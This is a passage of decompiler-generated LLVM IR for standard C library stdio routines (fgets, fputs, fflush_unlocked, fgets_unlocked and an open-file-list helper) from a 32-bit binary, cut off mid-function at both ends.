  %v2_804ede6 = inttoptr i32 %v1_804ede6 to i32*
  %v3_804ede6 = load i32, i32* %v2_804ede6, align 4
  %v1_804ede9 = icmp eq i32 %v3_804ede6, 0
  %v1_804edeb = icmp eq i1 %v1_804ede9, false
  br i1 %v1_804edeb, label %dec_label_pc_804ee0c.thread, label %dec_label_pc_804ee12

dec_label_pc_804ee0c.thread:                      ; preds = %entry
  %v2_804ee0c16 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804ee23

dec_label_pc_804ee12:                             ; preds = %entry
  %v1_804eded = add i32 %tmp5, 56
  store i32 %v12_804eddf, i32* @eax, align 4
  %v2_804edfc = call i32 @__pthread_return_void(i32 %v12_804eddf, i32 134550975)
  %v1_804ee04 = call i32 @__pthread_return_0(i32 %v1_804eded)
  %v0_804ee0c.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804ee0c = inttoptr i32 %v0_804ee0c.pre to i32*
  %v2_804ee0c = load i32, i32* %v1_804ee0c, align 4
  store i32 %v12_804eddf, i32* @eax, align 4
  %v2_804ee1b = call i32 @__pthread_return_void(i32 %v12_804eddf, i32 1)
  br label %dec_label_pc_804ee23

dec_label_pc_804ee23:                             ; preds = %dec_label_pc_804ee0c.thread, %dec_label_pc_804ee12
  %v0_804ee23 = phi i32 [ %v2_804ee0c, %dec_label_pc_804ee12 ], [ %v2_804ee0c16, %dec_label_pc_804ee0c.thread ]
  %v1_804ee28 = and i32 %v0_804ee23, 4
  ret i32 %v1_804ee28

; uselistorder directives
  uselistorder i32 %v12_804eddf, { 2, 3, 0, 1 }
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ee23, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804ee30 = load i32, i32* @edi, align 4
  %v0_804ee31 = load i32, i32* @esi, align 4
  %v0_804ee32 = load i32, i32* @ebx, align 4
  %v12_804ee33 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804ee3a = add i32 %arg3, 52
  %v2_804ee3a = inttoptr i32 %v1_804ee3a to i32*
  %v3_804ee3a = load i32, i32* %v2_804ee3a, align 4
  store i32 %v3_804ee3a, i32* @edi, align 4
  %v1_804ee3d = icmp eq i32 %v3_804ee3a, 0
  %v1_804ee3f = icmp eq i1 %v1_804ee3d, false
  br i1 %v1_804ee3f, label %entry.dec_label_pc_804ee60_crit_edge, label %dec_label_pc_804ee41

entry.dec_label_pc_804ee60_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804ee60

dec_label_pc_804ee41:                             ; preds = %entry
  %v1_804ee41 = add i32 %arg3, 56
  store i32 %v1_804ee41, i32* @ebx, align 4
  store i32 %v12_804ee33, i32* @eax, align 4
  %v2_804ee50 = call i32 @__pthread_return_void(i32 %v12_804ee33, i32 134550975)
  %v0_804ee55 = load i32, i32* @ebx, align 4
  %v1_804ee58 = call i32 @__pthread_return_0(i32 %v0_804ee55)
  %v0_804ee61.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ee60

dec_label_pc_804ee60:                             ; preds = %entry.dec_label_pc_804ee60_crit_edge, %dec_label_pc_804ee41
  %v0_804ee61 = phi i32 [ %arg3, %entry.dec_label_pc_804ee60_crit_edge ], [ %v0_804ee61.pre, %dec_label_pc_804ee41 ]
  %v0_804ee60 = load i32, i32* @edx, align 4
  %v4_804ee6a = inttoptr i32 %arg1 to i8*
  %v5_804ee6a = call i32 @__GI_fgets_unlocked(i8* %v4_804ee6a, i32 %arg2, i32 %v0_804ee61, i32 %v0_804ee60)
  store i32 %v5_804ee6a, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ee3f, label %dec_label_pc_804ee89, label %dec_label_pc_804ee78

dec_label_pc_804ee78:                             ; preds = %dec_label_pc_804ee60
  store i32 %v12_804ee33, i32* @eax, align 4
  %v2_804ee81 = call i32 @__pthread_return_void(i32 %v12_804ee33, i32 1)
  %v0_804ee8c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ee89

dec_label_pc_804ee89:                             ; preds = %dec_label_pc_804ee60, %dec_label_pc_804ee78
  %v0_804ee8c = phi i32 [ %v5_804ee6a, %dec_label_pc_804ee60 ], [ %v0_804ee8c.pre, %dec_label_pc_804ee78 ]
  store i32 %v0_804ee32, i32* @ebx, align 4
  store i32 %v0_804ee31, i32* @esi, align 4
  store i32 %v0_804ee30, i32* @edi, align 4
  ret i32 %v0_804ee8c

; uselistorder directives
  uselistorder i32 %v12_804ee33, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804ee89, { 1, 0 }
  uselistorder label %dec_label_pc_804ee60, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804ee94 = load i32, i32* @edi, align 4
  %v0_804ee95 = load i32, i32* @esi, align 4
  %v0_804ee96 = load i32, i32* @ebx, align 4
  %v12_804ee97 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_804ee9e = add i32 %arg2, 52
  %v2_804ee9e = inttoptr i32 %v1_804ee9e to i32*
  %v3_804ee9e = load i32, i32* %v2_804ee9e, align 4
  store i32 %v3_804ee9e, i32* @edi, align 4
  %v1_804eea1 = icmp eq i32 %v3_804ee9e, 0
  %v1_804eea3 = icmp eq i1 %v1_804eea1, false
  br i1 %v1_804eea3, label %entry.dec_label_pc_804eec4_crit_edge, label %dec_label_pc_804eea5

entry.dec_label_pc_804eec4_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804eec4

dec_label_pc_804eea5:                             ; preds = %entry
  %v1_804eea5 = add i32 %arg2, 56
  store i32 %v1_804eea5, i32* @ebx, align 4
  store i32 %v12_804ee97, i32* @eax, align 4
  %v2_804eeb4 = call i32 @__pthread_return_void(i32 %v12_804ee97, i32 134550975)
  %v0_804eeb9 = load i32, i32* @ebx, align 4
  %v1_804eebc = call i32 @__pthread_return_0(i32 %v0_804eeb9)
  %v0_804eec6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804eec4

dec_label_pc_804eec4:                             ; preds = %entry.dec_label_pc_804eec4_crit_edge, %dec_label_pc_804eea5
  %v0_804eec6 = phi i32 [ %arg2, %entry.dec_label_pc_804eec4_crit_edge ], [ %v0_804eec6.pre, %dec_label_pc_804eea5 ]
  %v0_804eec4 = load i32, i32* @edx, align 4
  %v4_804eecb = inttoptr i32 %arg1 to i8*
  %v5_804eecb = call i32 @__GI_fputs_unlocked(i8* %v4_804eecb, i32 %v0_804eec6, i32 %v0_804eec4, i32 %v0_804eec4)
  store i32 %v5_804eecb, i32* %ebx.global-to-local, align 4
  br i1 %v1_804eea3, label %dec_label_pc_804eeea, label %dec_label_pc_804eed9

dec_label_pc_804eed9:                             ; preds = %dec_label_pc_804eec4
  store i32 %v12_804ee97, i32* @eax, align 4
  %v2_804eee2 = call i32 @__pthread_return_void(i32 %v12_804ee97, i32 1)
  %v0_804eeed.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eeea

dec_label_pc_804eeea:                             ; preds = %dec_label_pc_804eec4, %dec_label_pc_804eed9
  %v0_804eeed = phi i32 [ %v5_804eecb, %dec_label_pc_804eec4 ], [ %v0_804eeed.pre, %dec_label_pc_804eed9 ]
  store i32 %v0_804ee96, i32* @ebx, align 4
  store i32 %v0_804ee95, i32* @esi, align 4
  store i32 %v0_804ee94, i32* @edi, align 4
  ret i32 %v0_804eeed

; uselistorder directives
  uselistorder i32 %v12_804ee97, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804eeea, { 1, 0 }
  uselistorder label %dec_label_pc_804eec4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804ef03 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ef03, i32* @eax, align 4
  %v2_804ef08 = call i32 @__pthread_return_void(i32 %v2_804ef03, i32 134550975)
  %v1_804ef14 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059894.195 to i32))
  %v0_804ef19 = load i32, i32* @global_var_805db24.196, align 4
  %v8_804ef21 = icmp eq i32 %v0_804ef19, 1
  %v1_804ef22 = icmp eq i1 %v8_804ef21, false
  br i1 %v1_804ef22, label %dec_label_pc_804efb9, label %dec_label_pc_804ef28

dec_label_pc_804ef28:                             ; preds = %entry
  %v0_804ef28 = load i32, i32* @global_var_805db28.197, align 8
  %tmp29 = icmp slt i32 %v0_804ef28, 1
  br i1 %tmp29, label %dec_label_pc_804efb9, label %dec_label_pc_804ef35

dec_label_pc_804ef35:                             ; preds = %dec_label_pc_804ef28
  store i32 0, i32* @esi, align 4
  %v2_804ef42 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804ef42, i32* @eax, align 4
  %v2_804ef47 = call i32 @__pthread_return_void(i32 %v2_804ef42, i32 134550975)
  %v1_804ef53 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805987c.199 to i32))
  %v0_804ef58 = load i32, i32* bitcast (i32** @global_var_8059878.200 to i32*), align 8
  store i32 %v0_804ef58, i32* %edx.global-to-local, align 4
  %v1_804ef9a3 = icmp eq i32 %v0_804ef58, 0
  %v1_804ef9c10 = icmp eq i1 %v1_804ef9a3, false
  br i1 %v1_804ef9c10, label %dec_label_pc_804ef63, label %dec_label_pc_804ef9e

dec_label_pc_804ef63:                             ; preds = %dec_label_pc_804ef35, %dec_label_pc_804ef98
  %v0_804ef73 = phi i32 [ %v0_804ef98, %dec_label_pc_804ef98 ], [ %v0_804ef58, %dec_label_pc_804ef35 ]
  %v1_804ef6313 = inttoptr i32 %v0_804ef73 to i16*
  %v2_804ef63 = load i16, i16* %v1_804ef6313, align 2
  %v1_804ef6b = add i32 %v0_804ef73, 32
  %v2_804ef6b = inttoptr i32 %v1_804ef6b to i32*
  %v3_804ef6b = load i32, i32* %v2_804ef6b, align 4
  store i32 %v3_804ef6b, i32* @ebx, align 4
  %v1_804ef66 = and i16 %v2_804ef63, -32720
  %v6_804ef6e = icmp eq i16 %v1_804ef66, 48
  br i1 %v6_804ef6e, label %dec_label_pc_804ef77, label %dec_label_pc_804ef73

dec_label_pc_804ef73:                             ; preds = %dec_label_pc_804ef63
  store i32 %v0_804ef73, i32* @esi, align 4
  br label %dec_label_pc_804ef98

dec_label_pc_804ef77:                             ; preds = %dec_label_pc_804ef63
  %v0_804ef77 = load i32, i32* @esi, align 4
  %v1_804ef77 = icmp eq i32 %v0_804ef77, 0
  %v1_804ef79 = icmp eq i1 %v1_804ef77, false
  br i1 %v1_804ef79, label %dec_label_pc_804ef83, label %dec_label_pc_804ef7b

dec_label_pc_804ef7b:                             ; preds = %dec_label_pc_804ef77
  store i32 %v3_804ef6b, i32* bitcast (i32** @global_var_8059878.200 to i32*), align 8
  br label %dec_label_pc_804ef86

dec_label_pc_804ef83:                             ; preds = %dec_label_pc_804ef77
  %v2_804ef83 = add i32 %v0_804ef77, 32
  %v3_804ef83 = inttoptr i32 %v2_804ef83 to i32*
  store i32 %v3_804ef6b, i32* %v3_804ef83, align 4
  %v0_804ef86.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ef86

dec_label_pc_804ef86:                             ; preds = %dec_label_pc_804ef7b, %dec_label_pc_804ef83
  %v0_804ef8f = phi i32 [ %v0_804ef73, %dec_label_pc_804ef7b ], [ %v0_804ef86.pre, %dec_label_pc_804ef83 ]
  %v1_804ef86 = add i32 %v0_804ef8f, 1
  %v2_804ef86 = inttoptr i32 %v1_804ef86 to i8*
  %v3_804ef86 = load i8, i8* %v2_804ef86, align 1
  %v4_804ef86 = and i8 %v3_804ef86, 32
  %v5_804ef86 = icmp eq i8 %v4_804ef86, 0
  br i1 %v5_804ef86, label %dec_label_pc_804ef98, label %dec_label_pc_804ef8c

dec_label_pc_804ef8c:                             ; preds = %dec_label_pc_804ef86
  %v1_804ef90 = call i32 @free(i32 %v0_804ef8f)
  br label %dec_label_pc_804ef98

dec_label_pc_804ef98:                             ; preds = %dec_label_pc_804ef86, %dec_label_pc_804ef73, %dec_label_pc_804ef8c
  %v0_804ef98 = load i32, i32* @ebx, align 4
  store i32 %v0_804ef98, i32* %edx.global-to-local, align 4
  %v1_804ef9a = icmp eq i32 %v0_804ef98, 0
  %v1_804ef9c = icmp eq i1 %v1_804ef9a, false
  br i1 %v1_804ef9c, label %dec_label_pc_804ef63, label %dec_label_pc_804ef9e

dec_label_pc_804ef9e:                             ; preds = %dec_label_pc_804ef98, %dec_label_pc_804ef35
  store i32 %v2_804ef42, i32* @eax, align 4
  %v2_804efa7 = call i32 @__pthread_return_void(i32 %v2_804ef42, i32 1)
  store i32 0, i32* @global_var_805db28.197, align 8
  %v0_804efb9.pre = load i32, i32* @global_var_805db24.196, align 4
  br label %dec_label_pc_804efb9

dec_label_pc_804efb9:                             ; preds = %dec_label_pc_804ef28, %entry, %dec_label_pc_804ef9e
  %v0_804efb9 = phi i32 [ %v0_804ef19, %dec_label_pc_804ef28 ], [ %v0_804ef19, %entry ], [ %v0_804efb9.pre, %dec_label_pc_804ef9e ]
  %v1_804efbe = add i32 %v0_804efb9, -1
  store i32 %v1_804efbe, i32* @global_var_805db24.196, align 4
  store i32 %v2_804ef03, i32* @eax, align 4
  %v2_804efcd = call i32 @__pthread_return_void(i32 %v2_804ef03, i32 1)
  ret i32 %v2_804efcd

; uselistorder directives
  uselistorder i32 %v0_804ef98, { 1, 2, 0 }
  uselistorder i32 %v0_804ef73, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ef19, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804efb9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef86, { 1, 0 }
  uselistorder label %dec_label_pc_804ef63, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804efd8 = load i32, i32* @ebp, align 4
  %v0_804efd9 = load i32, i32* @edi, align 4
  %v0_804efda = load i32, i32* @esi, align 4
  %v0_804efdb = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_804efe1 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804efe1, i32* @ebx, align 4
  %v10_804efe5 = icmp eq i16* %arg1, inttoptr (i32 134584440 to i16*)
  br i1 %v10_804efe5, label %dec_label_pc_804effa, label %dec_label_pc_804efed

dec_label_pc_804efed:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_804eff2 = icmp eq i16* %arg1, null
  %v1_804eff4 = icmp eq i1 %v2_804eff2, false
  br i1 %v1_804eff4, label %dec_label_pc_804f0e9, label %dec_label_pc_804effa

dec_label_pc_804effa:                             ; preds = %dec_label_pc_804efed, %entry
  store i32 0, i32* @edi, align 4
  %v2_804f007 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f007, i32* @ebx, align 4
  %v2_804f00c = call i32 @__pthread_return_void(i32 %v2_804f007, i32 134550975)
  %v1_804f018 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059894.195 to i32))
  store i32 ptrtoint (i32* @global_var_8059894.195 to i32), i32* @ecx, align 4
  %v0_804f01e = load i32, i32* @global_var_805db24.196, align 4
  %v1_804f024 = add i32 %v0_804f01e, 1
  store i32 %v1_804f024, i32* @eax, align 4
  store i32 %v1_804f024, i32* @global_var_805db24.196, align 4
  %v2_804f02d = call i32 @__pthread_return_void(i32 %v2_804f007, i32 1)
  store i32 %v2_804f02d, i32* @eax, align 4
  %v2_804f040 = call i32 @__pthread_return_void(i32 %v2_804f007, i32 134550975)
  %v1_804f04c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805987c.199 to i32))
  store i32 ptrtoint (i32* @global_var_805987c.199 to i32), i32* @eax, align 4
  %v0_804f055 = load i32, i32* bitcast (i32** @global_var_8059878.200 to i32*), align 8
  store i32 %v0_804f055, i32* @esi, align 4
  %v2_804f05c = call i32 @__pthread_return_void(i32 %v2_804f007, i32 1)
  %v0_804f0de1 = load i32, i32* @esi, align 4
  %v1_804f0de2 = icmp eq i32 %v0_804f0de1, 0
  %v1_804f0e09 = icmp eq i1 %v1_804f0de2, false
  br i1 %v1_804f0e09, label %dec_label_pc_804f066, label %dec_label_pc_804f0e2

dec_label_pc_804f066:                             ; preds = %dec_label_pc_804effa, %dec_label_pc_804f0db
  %v0_804f074 = phi i32 [ %v3_804f0db, %dec_label_pc_804f0db ], [ %v0_804f0de1, %dec_label_pc_804effa ]
  %v1_804f066 = inttoptr i32 %v0_804f074 to i8*
  %v2_804f066 = load i8, i8* %v1_804f066, align 1
  %v3_804f066 = and i8 %v2_804f066, 64
  %v4_804f066 = icmp eq i8 %v3_804f066, 0
  br i1 %v4_804f066, label %dec_label_pc_804f0db, label %dec_label_pc_804f06b

dec_label_pc_804f06b:                             ; preds = %dec_label_pc_804f066
  %v0_804f06b = load i32, i32* @global_var_80598ac.198, align 4
  %v9_804f06b = icmp eq i32 %v0_804f06b, 2
  br i1 %v9_804f06b, label %dec_label_pc_804f093, label %dec_label_pc_804f074

dec_label_pc_804f074:                             ; preds = %dec_label_pc_804f06b
  %v1_804f074 = add i32 %v0_804f074, 56
  store i32 %v1_804f074, i32* @ebx, align 4
  store i32 %v2_804f007, i32* @eax, align 4
  %v2_804f083 = call i32 @__pthread_return_void(i32 %v2_804f007, i32 134550975)
  %v0_804f088 = load i32, i32* @ebx, align 4
  %v1_804f08b = call i32 @__pthread_return_0(i32 %v0_804f088)
  %v1_804f095.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f093

dec_label_pc_804f093:                             ; preds = %dec_label_pc_804f06b, %dec_label_pc_804f074
  %v0_804f0a5 = phi i32 [ %v0_804f074, %dec_label_pc_804f06b ], [ %v1_804f095.pre, %dec_label_pc_804f074 ]
  %v0_804f093 = load i32, i32* @ebp, align 4
  %v2_804f095 = inttoptr i32 %v0_804f0a5 to i32*
  %v3_804f095 = load i32, i32* %v2_804f095, align 4
  %v4_804f095 = or i32 %v3_804f095, %v0_804f093
  %v2_804f097 = urem i32 %v4_804f095, 65536
  %v9_804f097 = and i32 %v2_804f097, 832
  %v2_804f09b = icmp eq i32 %v9_804f097, 320
  %v1_804f0a0 = icmp eq i1 %v2_804f09b, false
  br i1 %v1_804f0a0, label %dec_label_pc_804f0c1, label %dec_label_pc_804f0a2

dec_label_pc_804f0a2:                             ; preds = %dec_label_pc_804f093
  %v1_804f0a6 = call i32 @__stdio_wcommit(i32 %v0_804f0a5)
  %v1_804f0ae = icmp eq i32 %v1_804f0a6, 0
  br i1 %v1_804f0ae, label %dec_label_pc_804f0b7, label %dec_label_pc_804f0b2

dec_label_pc_804f0b2:                             ; preds = %dec_label_pc_804f0a2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804f0c1

dec_label_pc_804f0b7:                             ; preds = %dec_label_pc_804f0a2
  %v0_804f0b7 = load i32, i32* @esi, align 4
  %v1_804f0b7 = inttoptr i32 %v0_804f0b7 to i16*
  %v2_804f0b7 = load i16, i16* %v1_804f0b7, align 2
  %v3_804f0b7 = and i16 %v2_804f0b7, -65
  store i16 %v3_804f0b7, i16* %v1_804f0b7, align 2
  %v0_804f0bb = load i32, i32* @esi, align 4
  %v1_804f0bb = add i32 %v0_804f0bb, 8
  %v2_804f0bb = inttoptr i32 %v1_804f0bb to i32*
  %v3_804f0bb = load i32, i32* %v2_804f0bb, align 4
  %v2_804f0be = add i32 %v0_804f0bb, 28
  %v3_804f0be = inttoptr i32 %v2_804f0be to i32*
  store i32 %v3_804f0bb, i32* %v3_804f0be, align 4
  br label %dec_label_pc_804f0c1

dec_label_pc_804f0c1:                             ; preds = %dec_label_pc_804f093, %dec_label_pc_804f0b2, %dec_label_pc_804f0b7
  %v0_804f0c1 = load i32, i32* @global_var_80598ac.198, align 4
  %v9_804f0c1 = icmp eq i32 %v0_804f0c1, 2
  br i1 %v9_804f0c1, label %dec_label_pc_804f0db, label %dec_label_pc_804f0ca

dec_label_pc_804f0ca:                             ; preds = %dec_label_pc_804f0c1
  store i32 %v2_804f007, i32* @eax, align 4
  %v2_804f0d3 = call i32 @__pthread_return_void(i32 %v2_804f007, i32 1)
  br label %dec_label_pc_804f0db

dec_label_pc_804f0db:                             ; preds = %dec_label_pc_804f0c1, %dec_label_pc_804f066, %dec_label_pc_804f0ca
  %v0_804f0db = load i32, i32* @esi, align 4
  %v1_804f0db = add i32 %v0_804f0db, 32
  %v2_804f0db = inttoptr i32 %v1_804f0db to i32*
  %v3_804f0db = load i32, i32* %v2_804f0db, align 4
  store i32 %v3_804f0db, i32* @esi, align 4
  %v1_804f0de = icmp eq i32 %v3_804f0db, 0
  %v1_804f0e0 = icmp eq i1 %v1_804f0de, false
  br i1 %v1_804f0e0, label %dec_label_pc_804f066, label %dec_label_pc_804f0e2

dec_label_pc_804f0e2:                             ; preds = %dec_label_pc_804f0db, %dec_label_pc_804effa
  %v0_804f0e2 = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804f10f

dec_label_pc_804f0e9:                             ; preds = %dec_label_pc_804efed
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804f0eb = load i8, i8* %tmp23, align 1
  %v4_804f0eb = and i8 %v3_804f0eb, 64
  %v5_804f0eb = icmp eq i8 %v4_804f0eb, 0
  br i1 %v5_804f0eb, label %dec_label_pc_804f10f, label %dec_label_pc_804f0f0

dec_label_pc_804f0f0:                             ; preds = %dec_label_pc_804f0e9
  store i32 -1, i32* @edi, align 4
  %v1_804f0f7 = call i32 @__stdio_wcommit(i32 %v4_804efe1)
  %v1_804f0ff = icmp eq i32 %v1_804f0f7, 0
  %v1_804f101 = icmp eq i1 %v1_804f0ff, false
  br i1 %v1_804f101, label %dec_label_pc_804f10f, label %dec_label_pc_804f103

dec_label_pc_804f103:                             ; preds = %dec_label_pc_804f0f0
  %v3_804f103 = load i16, i16* %arg1, align 2
  %v4_804f103 = and i16 %v3_804f103, -65
  store i16 %v4_804f103, i16* %arg1, align 2
  %v2_804f107 = add i32 %v4_804efe1, 8
  %v3_804f107 = inttoptr i32 %v2_804f107 to i32*
  %v4_804f107 = load i32, i32* %v3_804f107, align 4
  %v3_804f10a = add i32 %v4_804efe1, 28
  %v4_804f10a = inttoptr i32 %v3_804f10a to i32*
  store i32 %v4_804f107, i32* %v4_804f10a, align 4
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804f10f

dec_label_pc_804f10f:                             ; preds = %dec_label_pc_804f0f0, %dec_label_pc_804f0e9, %dec_label_pc_804f0e2, %dec_label_pc_804f103
  %v0_804f112 = load i32, i32* @edi, align 4
  store i32 %v0_804efdb, i32* @ebx, align 4
  store i32 %v0_804efda, i32* @esi, align 4
  store i32 %v0_804efd9, i32* @edi, align 4
  store i32 %v0_804efd8, i32* @ebp, align 4
  ret i32 %v0_804f112

; uselistorder directives
  uselistorder i32 %v3_804f0db, { 1, 2, 0 }
  uselistorder i32 %v2_804f007, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* bitcast (i32** @global_var_8059878.200 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_805db24.196, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8059894.195 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804f10f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f0db, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f0c1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f093, { 1, 0 }
  uselistorder label %dec_label_pc_804f066, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804f11c = load i32, i32* @ebp, align 4
  %v4_804f123 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f123, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804f123, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_804f16d.preheader, label %dec_label_pc_804f179

dec_label_pc_804f16d.preheader:                   ; preds = %entry
  %v1_804f16d18 = add i32 %arg2, -1
  %v8_804f16d19 = icmp eq i32 %v1_804f16d18, 0
  store i32 %v1_804f16d18, i32* @esi, align 4
  %v1_804f16e20 = icmp eq i1 %v8_804f16d19, false
  br i1 %v1_804f16e20, label %dec_label_pc_804f137, label %dec_label_pc_804f170

dec_label_pc_804f137:                             ; preds = %dec_label_pc_804f16d.preheader, %dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge.dec_label_pc_804f137_crit_edge
  %v0_804f137 = phi i32 [ %v0_804f137.pre, %dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge.dec_label_pc_804f137_crit_edge ], [ %arg3, %dec_label_pc_804f16d.preheader ]
  %v1_804f137 = add i32 %v0_804f137, 16
  %v2_804f137 = inttoptr i32 %v1_804f137 to i32*
  %v3_804f137 = load i32, i32* %v2_804f137, align 4
  store i32 %v3_804f137, i32* %eax.global-to-local, align 4
  %v2_804f13a = add i32 %v0_804f137, 24
  %v3_804f13a = inttoptr i32 %v2_804f13a to i32*
  %v4_804f13a = load i32, i32* %v3_804f13a, align 4
  %v10_804f13a = icmp ult i32 %v3_804f137, %v4_804f13a
  %v1_804f13d = icmp eq i1 %v10_804f13a, false
  br i1 %v1_804f13d, label %dec_label_pc_804f14d, label %dec_label_pc_804f13f

dec_label_pc_804f13f:                             ; preds = %dec_label_pc_804f137
  %v1_804f13f = inttoptr i32 %v3_804f137 to i8*
  %v2_804f13f = load i8, i8* %v1_804f13f, align 1
  %v3_804f13f = zext i8 %v2_804f13f to i32
  %v4_804f13f = load i32, i32* @edx, align 4
  %v5_804f13f = and i32 %v4_804f13f, -256
  %v6_804f13f = or i32 %v5_804f13f, %v3_804f13f
  store i32 %v6_804f13f, i32* @edx, align 4
  %v1_804f141 = add i32 %v3_804f137, 1
  store i32 %v1_804f141, i32* %eax.global-to-local, align 4
  %v2_804f142 = load i32, i32* @ebx, align 4
  %v3_804f142 = inttoptr i32 %v2_804f142 to i8*
  store i8 %v2_804f13f, i8* %v3_804f142, align 1
  %v0_804f144 = load i32, i32* @ebx, align 4
  %v1_804f144 = add i32 %v0_804f144, 1
  store i32 %v1_804f144, i32* @ebx, align 4
  %v0_804f145 = load i32, i32* @edx, align 4
  %v1_804f145 = trunc i32 %v0_804f145 to i8
  %v10_804f145 = icmp eq i8 %v1_804f145, 10
  %v0_804f148 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f148 = load i32, i32* @ebp, align 4
  %v2_804f148 = add i32 %v1_804f148, 16
  %v3_804f148 = inttoptr i32 %v2_804f148 to i32*
  store i32 %v0_804f148, i32* %v3_804f148, align 4
  br i1 %v10_804f145, label %dec_label_pc_804f170, label %dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge

dec_label_pc_804f14d:                             ; preds = %dec_label_pc_804f137
  %v0_804f151 = call i32 @getc_unlocked()
  %v1_804f151 = trunc i32 %v0_804f151 to i8
  store i32 %v0_804f151, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804f151, 256
  %v11_804f159 = icmp eq i32 %sext.mask, 255
  %v1_804f15c = icmp eq i1 %v11_804f159, false
  br i1 %v1_804f15c, label %dec_label_pc_804f16b, label %dec_label_pc_804f15e

dec_label_pc_804f15e:                             ; preds = %dec_label_pc_804f14d
  %v0_804f15e = load i32, i32* @ebp, align 4
  %v1_804f15e = inttoptr i32 %v0_804f15e to i8*
  %v2_804f15e = load i8, i8* %v1_804f15e, align 1
  %v3_804f15e = and i8 %v2_804f15e, 8
  %v4_804f15e = icmp eq i8 %v3_804f15e, 0
  br i1 %v4_804f15e, label %dec_label_pc_804f170, label %dec_label_pc_804f179

dec_label_pc_804f16b:                             ; preds = %dec_label_pc_804f14d
  %v3_804f166 = load i32, i32* @ebx, align 4
  %v4_804f166 = inttoptr i32 %v3_804f166 to i8*
  store i8 %v1_804f151, i8* %v4_804f166, align 1
  %v0_804f168 = load i32, i32* @ebx, align 4
  %v1_804f168 = add i32 %v0_804f168, 1
  store i32 %v1_804f168, i32* @ebx, align 4
  %v11_804f169 = icmp eq i8 %v1_804f151, 10
  br i1 %v11_804f169, label %dec_label_pc_804f170, label %dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge

dec_label_pc_804f16b.dec_label_pc_804f16d_crit_edge: ; preds = %dec_label_pc_804f13f, %dec_label_pc_804f16b
  %v0_804f16d.pre = load i32, i32* @esi, align 4
  %v1_804f16d = add i32 %v0_804f16d.pre, -1
  %v8_804f16d = icmp eq i32 %v1_804f16d, 0
  store i32 %v1_804f16d, i32* @esi, align 4
